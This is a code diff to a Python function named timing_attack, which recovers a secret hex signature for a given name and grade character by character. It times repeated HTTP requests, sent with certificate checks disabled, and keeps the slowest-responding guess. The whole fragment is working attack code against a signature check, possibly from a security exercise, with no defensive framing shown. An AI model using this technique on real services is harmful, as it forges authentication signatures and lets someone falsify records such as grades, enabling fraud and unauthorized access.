@@ -9,20 +9,22 @@ def timing_attack(name, grade, size=20, retries=10):
   hex_string = '0123456789abcdef'
   print('Searching...')
 
-  signature = [''] * size
+  signature = []
 
   for i in range(size):
-    max_t = 0
+    max_char, max_t = None, 0
 
     for j in range(len(hex_string)):
-      params['signature'] = ''.join(signature[:i]) + hex_string[j]
+      curr_char = hex_string[j]
+      params['signature'] = ''.join(signature) + curr_char
 
       R = [requests.get(url, params, verify=False) for i in range(retries)]
       t = min([r.elapsed.total_seconds() for r in R])
 
       if(t > max_t):
-        max_t = t
-        signature[i] = hex_string[j]
+        max_char, max_t = curr_char, t
+
+    signature.append(max_char)
 
     print('{}/{}'.format(i+1, size), ''.join(signature))
   
